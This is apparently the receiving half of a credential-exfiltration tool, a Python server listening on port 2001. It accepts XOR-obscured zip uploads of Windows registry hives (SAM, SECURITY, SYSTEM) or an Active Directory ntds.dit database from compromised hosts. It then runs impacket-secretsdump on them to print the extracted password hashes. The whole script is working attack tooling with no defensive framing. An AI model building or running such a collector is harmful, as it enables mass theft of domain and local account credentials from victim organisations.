import socket
import argparse
import subprocess
import zipfile
import os
import shutil

def xor_cipher(data, key):
    return bytes(a ^ b for a, b in zip(data, key.encode() * (len(data) // len(key.encode()) + 1)))

def main(xor_key=None, show=False):
    server_ip = '0.0.0.0'
    server_port = 2001

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((server_ip, server_port))
        server_socket.listen()
        print(f"[*] Listening on {server_ip}:{server_port}")

        while True:
            conn, addr = server_socket.accept()
            with conn:
                print(f"[+] Connected by {addr}")
                received_data = bytearray()
                while (data := conn.recv(1024)):
                    received_data.extend(data)

                if xor_key:
                    received_data = xor_cipher(received_data, xor_key)

                zip_filename = f"{addr[0]}_files.zip"
                with open(zip_filename, 'wb') as file:
                    file.write(received_data)
                print(f"[+] Received and saved file from {addr[0]}")

                if show:
                    os.makedirs("./temp", exist_ok=True)
                    with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
                        zip_ref.extractall("./temp")

                    ntds_present = os.path.isfile("./temp/ntds.dit")
                    if ntds_present:
                        cmd_args = [
                            "impacket-secretsdump",
                            "-ntds",
                            "./temp/ntds.dit",
                            "-security",
                            "./temp/SECURITY",
                            "-system",
                            "./temp/SYSTEM",
                            "LOCAL",
                        ]
                    else:
                        cmd_args = [
                            "impacket-secretsdump",
                            "-sam",
                            "./temp/SAM",
                            "-security",
                            "./temp/SECURITY",
                            "-system",
                            "./temp/SYSTEM",
                            "LOCAL",
                        ]

                    result = subprocess.run(cmd_args, capture_output=True, text=True)

                    print("Output of impacket-secretsdump:")
                    print(result.stdout)

                    archive_dir = f"archive_{zip_filename}"
                    os.makedirs(archive_dir, exist_ok=True)
                    shutil.move("./temp", archive_dir)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Receive and save files from clients.")
    parser.add_argument("-xor", "--xor_key", help="XOR key to encrypt/decrypt received files.", type=str)
    parser.add_argument("--show", help="Unzip, decrypt (if key provided), and show secretsdump output.", action="store_true")
    args = parser.parse_args()

    main(xor_key=args.xor_key, show=args.show)